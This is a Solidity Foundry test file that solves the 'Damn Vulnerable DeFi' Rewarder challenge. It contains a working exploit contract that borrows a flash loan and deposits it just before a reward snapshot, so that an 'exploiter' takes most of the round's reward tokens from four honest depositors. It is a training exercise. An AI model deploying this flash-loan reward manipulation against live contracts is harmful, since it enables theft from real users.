// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../src/DamnValuableToken.sol";
import {FlashLoanerPool} from "../src/FlashLoanerPool.sol";
import {AccountingToken} from "../src/AccountingToken.sol";
import {RewardToken} from "../src/RewardToken.sol";
import {TheRewarderPool} from "../src/TheRewarderPool.sol";

     
contract RewardExtractor{
    FlashLoanerPool flashLoanerPool;
    DamnValuableToken liquidityToken;
    TheRewarderPool theRewarderPool;
    RewardToken rewardToken;
                   
    address player;

    constructor(FlashLoanerPool _flashLoanerPool, DamnValuableToken _liquidityToken, TheRewarderPool _theRewarderPool) {
        flashLoanerPool = _flashLoanerPool;
        liquidityToken = _liquidityToken;
        theRewarderPool = _theRewarderPool;
        rewardToken = theRewarderPool.rewardToken();
        
        player = msg.sender;
    }

    function execute(uint256 _amount) external  {
        flashLoanerPool.flashLoan(_amount);
    } 

    function receiveFlashLoan(uint256 _amount) external  {
        require(msg.sender == address(flashLoanerPool));

        liquidityToken.approve(address(theRewarderPool), _amount);
        theRewarderPool.deposit(_amount);
        theRewarderPool.distributeRewards();
        theRewarderPool.withdraw(_amount);
        
        liquidityToken.transfer(address(flashLoanerPool), _amount);
        rewardToken.transfer(player, rewardToken.balanceOf(address(this)));
    } 
}

contract TestCanTakeAllRewards is Test{
    DamnValuableToken liquidityToken;
    FlashLoanerPool flashLoanerPool;
    AccountingToken accountingToken;
    RewardToken rewardToken;
    TheRewarderPool theRewarderPool;
    RewardExtractor rewardExtractor;

    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");
    address david = makeAddr("david");
    address exploiter = makeAddr("exploiter");

    uint256 AMOUNT_IN_POOL = 1000000 ether;
    uint256 DEPOSIT_AMOUNT = 100 ether;


    function setUp() public {
        liquidityToken = new DamnValuableToken(); 
        flashLoanerPool = new FlashLoanerPool(address(liquidityToken));

        liquidityToken.transfer(address(flashLoanerPool), AMOUNT_IN_POOL);
        assertEq(liquidityToken.balanceOf(address(flashLoanerPool)), AMOUNT_IN_POOL);

        theRewarderPool = new TheRewarderPool(address(liquidityToken));

        accountingToken = theRewarderPool.accountingToken();
        rewardToken = theRewarderPool.rewardToken();
        assertEq(accountingToken.owner(), address(theRewarderPool));

        uint256 minterRole =  accountingToken.MINTER_ROLE();
        uint256 snapshotRole = accountingToken.SNAPSHOT_ROLE();
        uint256 burnerRole =  accountingToken.BURNER_ROLE();
        assertEq(accountingToken.hasAllRoles(address(theRewarderPool), minterRole | snapshotRole | burnerRole), true);

        // Alice, Bob, Charlie and David have tokens to deposit
        liquidityToken.transfer(address(alice), DEPOSIT_AMOUNT);
        liquidityToken.transfer(address(bob), DEPOSIT_AMOUNT);
        liquidityToken.transfer(address(charlie), DEPOSIT_AMOUNT);
        liquidityToken.transfer(address(david), DEPOSIT_AMOUNT);

  
        
     }

     function test__canTakeAllRewards() public {
        //Alice, Bob, Charlie and David deposit tokens
        uint256 rewardsInRounds = theRewarderPool.REWARDS();
        vm.startPrank(alice);
        liquidityToken.approve(address(theRewarderPool), DEPOSIT_AMOUNT);
        theRewarderPool.deposit(DEPOSIT_AMOUNT);
        assertEq(accountingToken.balanceOf(alice), DEPOSIT_AMOUNT);
        vm.stopPrank();

        vm.startPrank(bob);
        liquidityToken.approve(address(theRewarderPool), DEPOSIT_AMOUNT);
        theRewarderPool.deposit(DEPOSIT_AMOUNT);
        assertEq(accountingToken.balanceOf(bob), DEPOSIT_AMOUNT);
        vm.stopPrank();

        vm.startPrank(charlie);
        liquidityToken.approve(address(theRewarderPool), DEPOSIT_AMOUNT);
        theRewarderPool.deposit(DEPOSIT_AMOUNT);
        assertEq(accountingToken.balanceOf(bob), DEPOSIT_AMOUNT);
        vm.stopPrank();

        vm.startPrank(david);
        liquidityToken.approve(address(theRewarderPool), DEPOSIT_AMOUNT);
        theRewarderPool.deposit(DEPOSIT_AMOUNT);
        assertEq(accountingToken.balanceOf(bob), DEPOSIT_AMOUNT);
        vm.stopPrank();

        assertEq(accountingToken.totalSupply(), DEPOSIT_AMOUNT * 4);

         // Advance time 5 days so that depositors can get rewards
         vm.warp(5 days + 1);

        //Take Out Rewards
         vm.prank(alice);
         theRewarderPool.distributeRewards();
         assertEq(rewardToken.balanceOf(alice), rewardsInRounds/4);
         vm.prank(bob);
         theRewarderPool.distributeRewards();
         assertEq(rewardToken.balanceOf(bob), rewardsInRounds/4);
         vm.prank(charlie);
         theRewarderPool.distributeRewards();
         assertEq(rewardToken.balanceOf(charlie), rewardsInRounds/4);
         vm.prank(david);
         theRewarderPool.distributeRewards();
         assertEq(rewardToken.balanceOf(david), rewardsInRounds/4);

         assertEq(rewardToken.totalSupply(), rewardsInRounds);

        // EACH players(liquidity tokens) DVT tokens in balance
        assertEq(liquidityToken.balanceOf(alice), 0);
        assertEq(liquidityToken.balanceOf(bob), 0);
        assertEq(liquidityToken.balanceOf(charlie), 0);
        assertEq(liquidityToken.balanceOf(david), 0);
        
        // Two rounds must have occurred so far
        assertEq(theRewarderPool.roundNumber(), 2);
 
        vm.startPrank(exploiter);
        vm.warp(10 days + 1);
        rewardExtractor = new RewardExtractor(flashLoanerPool, liquidityToken, theRewarderPool);
        rewardExtractor.execute(liquidityToken.balanceOf(address(flashLoanerPool)));
        console.log(rewardToken.totalSupply());
        console.log(rewardToken.balanceOf(exploiter)); //PROOF THAT THE EXPLOITER TAKES THE A LARGE PORTION OF THE REWARD TOKEN AFTER 5 DAYS
        assertEq(theRewarderPool.roundNumber(), 3);
        vm.stopPrank(); 
     }
}